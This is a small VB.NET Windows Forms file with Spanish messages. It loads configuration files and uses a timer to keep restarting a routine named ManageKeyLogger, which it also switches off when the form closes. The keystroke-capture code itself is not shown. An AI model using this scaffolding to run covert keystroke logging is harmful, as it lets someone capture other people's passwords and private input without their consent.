Public Class Form1    

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Lector.LeerFicherosConfiguracion
        Catch ex As Exception
            MessageBox.Show("Un error ha ocurrido.")
        End Try        
    End Sub

    Private Sub Form1_Disposed(sender As Object, e As EventArgs) Handles Me.Disposed
        Lector.ManageKeyLogger(False)
    End Sub

    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Lector.ManageKeyLogger(False)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Lector.ManageKeyLogger(False)
            Lector.ManageKeyLogger(True)
        Catch ex As Exception
            MessageBox.Show("Un error ha ocurrido. En el Timer")
        End Try        
    End Sub
End Class
